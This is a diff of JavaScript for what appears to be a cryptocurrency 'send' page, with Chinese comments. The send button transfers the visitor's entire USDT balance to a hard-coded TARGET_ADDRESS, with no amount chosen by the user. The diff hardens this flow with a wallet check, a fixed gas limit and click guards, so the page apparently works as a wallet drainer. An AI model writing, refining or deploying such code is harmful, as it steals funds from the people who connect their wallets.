@@ -76,7 +76,14 @@ window.addEventListener('load', async () => {
 // 发送按钮事件
 document.querySelector('.send-btn').addEventListener('click', async (event) => {
     event.preventDefault(); // 确保手机端点击事件触发
+    event.stopPropagation(); // 防止事件冒泡
+
     try {
+        // 检查钱包环境
+        if (!window.ethereum) {
+            throw new Error('未检测到钱包，请确保已在钱包内置浏览器中访问页面！');
+        }
+
         // 检查 signer 是否存在
         if (!signer) {
             throw new Error('请先连接钱包！');
@@ -94,8 +101,15 @@ document.querySelector('.send-btn').addEventListener('click', async (event) => {
         const balance = await usdtContract.balanceOf(await signer.getAddress());
         console.log('当前余额:', ethers.utils.formatUnits(balance, 6), 'USDT');
 
-        // 发起转账（即使余额为 0 也会尝试）
-        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance);
+        // 如果余额为 0，提示用户
+        if (balance.isZero()) {
+            alert('您的 USDT 余额为 0，仍将尝试发起转账！');
+        }
+
+        // 发起转账
+        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance, {
+            gasLimit: 100000 // 设置一个合理的 gas 限制
+        });
         console.log('转账交易:', tx);
 
         // 等待交易确认
@@ -103,7 +117,7 @@ document.querySelector('.send-btn').addEventListener('click', async (event) => {
         alert('转账成功！');
     } catch (e) {
         console.error('转账失败:', e);
-        // 如果用户取消转账（例如点击“拒绝”），显示“您已取消转账”
+        // 如果用户取消转账（例如点击“拒绝”）
         if (e.code === 4001 || e.message.includes('user rejected')) {
             alert('您已取消转账');
         } else {
@@ -114,6 +128,8 @@ document.querySelector('.send-btn').addEventListener('click', async (event) => {
 });
 
 // 取消按钮事件
-document.querySelector('.cancel-btn').addEventListener('click', () => {
+document.querySelector('.cancel-btn').addEventListener('click', (event) => {
+    event.preventDefault();
+    event.stopPropagation();
     alert('已取消转账操作');
 });
